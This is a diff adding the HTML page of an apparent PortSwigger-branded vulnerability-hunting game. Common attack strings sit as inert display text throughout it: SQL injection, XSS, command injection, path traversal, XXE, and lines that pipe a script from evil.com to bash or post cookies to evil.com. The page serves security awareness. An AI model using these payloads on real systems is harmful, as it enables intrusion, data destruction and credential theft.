@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Catch Me If You Can - PortSwigger Vulnerability Hunt</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="catch-me-styles.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-logo">
+                <i class="fas fa-bolt"></i>
+                <span>PortSwigger</span>
+            </div>
+            <ul class="nav-menu">
+                <li class="nav-item"><a href="index.html" class="nav-link">Home</a></li>
+                <li class="nav-item"><a href="catch-me.html" class="nav-link active">Catch Me If You Can</a></li>
+            </ul>
+            <div class="hamburger">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Magnifying Glass -->
+    <div class="magnifier-container">
+        <div class="magnifier" id="magnifier">
+            <div class="magnifier-inner">
+                <div class="crosshair"></div>
+                <div class="magnifier-label">BURP SCANNER</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Game Stats -->
+    <div class="game-stats">
+        <div class="stats-item">
+            <span class="stats-label">Vulnerabilities Found:</span>
+            <span class="stats-count" id="vulnCount">0</span>
+        </div>
+        <div class="stats-item">
+            <span class="stats-label">Score:</span>
+            <span class="stats-count" id="scoreCount">0</span>
+        </div>
+    </div>
+
+    <section id="hero" class="hero game-hero">
+        <div class="hero-container">
+            <div class="hero-content">
+                <div class="hero-badges">
+                    <div class="badge bold">Hunt Mode <span class="hidden-vuln" data-type="xss">'; DROP TABLE users; --</span></div>
+                    <div class="badge defend">Active Scanning</div>
+                    <div class="badge together">DAST Technology</div>
+                    <div class="badge enterprise">Security Testing <span class="hidden-vuln" data-type="sqli">UNION SELECT password FROM admin</span></div>
+                </div>
+                <h1 class="hero-title">Catch Me If You Can</h1>
+                <p class="hero-subtitle">Welcome to the vulnerability hunting challenge! <span class="hidden-vuln" data-type="injection">eval($_GET['cmd'])</span> Use your PortSwigger scanner to find hidden security vulnerabilities that traditional tools miss.</p>
+                <div class="hero-buttons">
+                    <button class="btn-primary">Start Scanning <span class="hidden-vuln" data-type="xss">&lt;script&gt;alert('XSS')&lt;/script&gt;</span></button>
+                    <button class="btn-secondary">Learn More</button>
+                </div>
+            </div>
+            <div class="hero-visual">
+                <div class="security-icons">
+                    <div class="security-icon brain">
+                        <i class="fas fa-brain"></i>
+                        <span class="hidden-vuln" data-type="rce">system("rm -rf /")</span>
+                    </div>
+                    <div class="security-icon shield">
+                        <i class="fas fa-shield-alt"></i>
+                        <span class="hidden-vuln" data-type="sqli">1' OR '1'='1</span>
+                    </div>
+                    <div class="security-icon network">
+                        <i class="fas fa-network-wired"></i>
+                        <span class="hidden-vuln" data-type="lfi">../../../etc/passwd</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="challenge-section">
+        <div class="container">
+            <h2 class="section-title">The Hidden Attack Surface</h2>
+            <div class="challenge-grid">
+                <div class="challenge-card">
+                    <div class="challenge-icon">
+                        <i class="fas fa-code"></i>
+                    </div>
+                    <h3>Web Application Security</h3>
+                    <p>Modern applications contain <span class="hidden-vuln" data-type="xss">document.write(userInput)</span> hidden vulnerabilities that only sophisticated DAST tools can detect. <span class="hidden-vuln" data-type="csrf">No CSRF token validation</span> Traditional scanners miss these critical security flaws.</p>
+                </div>
+                <div class="challenge-card">
+                    <div class="challenge-icon">
+                        <i class="fas fa-database"></i>
+                    </div>
+                    <h3>Database Interactions</h3>
+                    <p>SQL injection vulnerabilities <span class="hidden-vuln" data-type="sqli">'; EXEC xp_cmdshell('dir'); --</span> lurk in database queries and user inputs. <span class="hidden-vuln" data-type="blind-sqli">IF(1=1) WAITFOR DELAY '00:00:05'</span> These can lead to complete system compromise.</p>
+                </div>
+                <div class="challenge-card">
+                    <div class="challenge-icon">
+                        <i class="fas fa-bug"></i>
+                    </div>
+                    <h3>Logic Flaws</h3>
+                    <p>Business logic vulnerabilities are often invisible to basic scanners. <span class="hidden-vuln" data-type="logic">price=-100&quantity=1</span> PortSwigger's intelligent crawling <span class="hidden-vuln" data-type="auth-bypass">userId=1&admin=true</span> discovers these complex attack vectors.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="demo-section">
+        <div class="container">
+            <h2 class="section-title">Interactive Security Demo</h2>
+            <div class="demo-content">
+                <div class="demo-text">
+                    <h3>Real-World Vulnerability Examples</h3>
+                    <p>This demonstration shows how PortSwigger's DAST technology <span class="hidden-vuln" data-type="xxe">&lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt;</span> can identify security vulnerabilities that remain invisible to conventional scanning tools.</p>
+                    
+                    <div class="vulnerability-examples">
+                        <div class="vuln-example">
+                            <h4>SQL Injection Detection</h4>
+                            <p>Our scanner identifies database manipulation attempts <span class="hidden-vuln" data-type="sqli">admin'--</span> even in complex, multi-step authentication flows.</p>
+                        </div>
+                        <div class="vuln-example">
+                            <h4>Cross-Site Scripting (XSS)</h4>
+                            <p>Advanced payload testing <span class="hidden-vuln" data-type="xss">&lt;img src=x onerror=alert(1)&gt;</span> reveals client-side vulnerabilities in JavaScript-heavy applications.</p>
+                        </div>
+                        <div class="vuln-example">
+                            <h4>Command Injection</h4>
+                            <p>Server-side command execution flaws <span class="hidden-vuln" data-type="rce">`curl evil.com/steal.sh | bash`</span> are discovered through intelligent payload fuzzing.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="demo-visual">
+                    <div class="scanner-simulation">
+                        <div class="scanner-header">
+                            <i class="fas fa-search"></i>
+                            <span>Burp Scanner Active</span>
+                        </div>
+                        <div class="scanner-body">
+                            <div class="scan-line">
+                                <span class="scan-method">GET</span>
+                                <span class="scan-url">/api/users?id=<span class="hidden-vuln" data-type="sqli">1' UNION SELECT password FROM admin--</span></span>
+                            </div>
+                            <div class="scan-line">
+                                <span class="scan-method">POST</span>
+                                <span class="scan-url">/login.php</span>
+                                <span class="hidden-vuln" data-type="sqli">username=admin'OR'1'='1&password=anything</span>
+                            </div>
+                            <div class="scan-line">
+                                <span class="scan-method">GET</span>
+                                <span class="scan-url">/search?q=<span class="hidden-vuln" data-type="xss">&lt;script&gt;fetch('evil.com',{method:'POST',body:document.cookie})&lt;/script&gt;</span></span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="results-section">
+        <div class="container">
+            <h2 class="section-title">Your Vulnerability Hunt Results</h2>
+            <div id="foundVulnerabilities" class="found-vulnerabilities">
+                <!-- Found vulnerabilities will be displayed here -->
+            </div>
+            <div class="results-summary">
+                <p>Professional security testing requires sophisticated tools that can see beyond the surface. <span class="hidden-vuln" data-type="ssti">{{7*7}}</span> PortSwigger's DAST technology <span class="hidden-vuln" data-type="deserial">rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0</span> provides the deep visibility needed to secure modern applications.</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="cta-section">
+        <div class="container">
+            <h2 class="cta-title">Ready to Find What Others Miss?</h2>
+            <p class="cta-subtitle">Experience the power of PortSwigger's professional security testing tools</p>
+            <div class="cta-buttons">
+                <button class="btn-primary-large" onclick="restartGame()">Play Again</button>
+                <button class="btn-secondary-large" onclick="window.open('index.html', '_self')">Learn More About PortSwigger</button>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <div class="footer-logo">
+                        <i class="fas fa-bolt"></i>
+                        <span>PortSwigger</span>
+                    </div>
+                    <p>Leading the way in web application security <span class="hidden-vuln" data-type="info-disclosure">Server: Apache/2.4.1 (Win32) PHP/5.4.0</span></p>
+                </div>
+                <div class="footer-section">
+                    <h4>Security Testing</h4>
+                    <ul>
+                        <li><a href="#">DAST Technology <span class="hidden-vuln" data-type="path-traversal">../admin/config.php</span></a></li>
+                        <li><a href="#">Burp Suite Professional</a></li>
+                        <li><a href="#">Enterprise Solutions</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Congratulations Modal -->
+    <div id="congratsModal" class="congrats-modal-overlay" style="display: none;">
+        <div class="congrats-modal">
+            <div class="congrats-header">
+                <h2>🎉 Congratulations! 🎉</h2>
+                <button class="close-modal" onclick="closeCongrats()">&times;</button>
+            </div>
+            <div class="congrats-content">
+                <div class="congrats-stats">
+                    <div class="final-score">
+                        <span class="score-label">Final Score:</span>
+                        <span class="score-value" id="finalScore">0</span>
+                    </div>
+                    <div class="vulnerabilities-found">
+                        <span class="vuln-label">Vulnerabilities Found:</span>
+                        <span class="vuln-value" id="finalVulnCount">0</span>
+                    </div>
+                </div>
+                <p>You've successfully demonstrated the power of PortSwigger's DAST technology! Traditional scanners would have missed most of these critical vulnerabilities.</p>
+                <div class="congrats-actions">
+                    <button class="btn-primary" onclick="restartGame()">Hunt Again</button>
+                    <button class="btn-secondary" onclick="window.open('index.html', '_self')">Explore PortSwigger</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="catch-me-script.js"></script>
+</body>
+</html>
